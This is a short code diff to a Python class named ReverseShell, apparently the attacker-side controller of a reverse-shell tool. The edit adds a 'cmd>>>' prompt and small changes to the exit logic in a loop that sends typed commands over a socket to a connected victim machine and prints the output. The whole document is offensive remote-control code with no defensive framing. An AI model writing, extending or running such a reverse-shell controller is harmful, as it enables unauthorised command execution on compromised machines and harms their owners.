@@ -37,14 +37,19 @@ class ReverseShell():
 
 	#Send command to client 
 	def send_command(self):
-
+		flag=0
 		while True:
-			cmd = input()
+			if flag==0:
+				cmd = input("cmd>>>")
+				flag=1
+			else:
+				cmd = input()
+				
 			if cmd=="quit":
 				self.conn.close()
 				self.s.close()
-				sys.exit()
-			if len(str.encode( cmd )) > 0 :
+				exit()
+			elif len(str.encode( cmd )) > 0 :
 				self.conn.send( str.encode(cmd) )
 				client_response = str( self.conn.recv(1024), "utf-8" )
 				print( client_response, end="" )
